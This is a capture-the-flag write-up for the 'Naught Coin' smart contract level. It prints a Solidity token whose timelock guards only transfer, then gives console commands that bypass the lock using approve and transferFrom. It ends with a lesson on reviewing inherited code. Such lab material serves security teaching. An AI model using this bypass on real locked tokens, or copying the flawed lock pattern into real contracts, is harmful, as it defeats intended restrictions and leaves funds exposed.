# Naught Coin
_difficulty 5/10_

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.  
Things that might help  
- The ERC20 Spec
- The OpenZeppelin codebase

 contract NaughtCoin is StandardToken {
  
  using SafeMath for uint256;
  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 years;
  uint public INITIAL_SUPPLY = (10 ** decimals).mul(1000000);
  address public player;

  function NaughtCoin(address _player) public {
    player = _player;
    totalSupply_ = INITIAL_SUPPLY;
    balances[player] = INITIAL_SUPPLY;
    Transfer(0x0, player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
}

## Naught Coin solution

1. Check current player balance  
`web3.fromWei(await contract.balanceOf(player))`  
"1000000"  

2. The contract puts locks only on the `transfer` method, but ignores the `approve` and `transferFrom` methods. Let's approve the player to transfer the funds.
`await contract.approve(player, web3.toWei(1000000))`  

3. Now we can use `transferFrom` to transfer funds to some address.
`await contract.transferFrom(player, 0x1, web3.toWei(1000000))`

4. Check player's current balance
`web3.fromWei(await contract.balanceOf(player))`  
"0"

## Lesson  

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
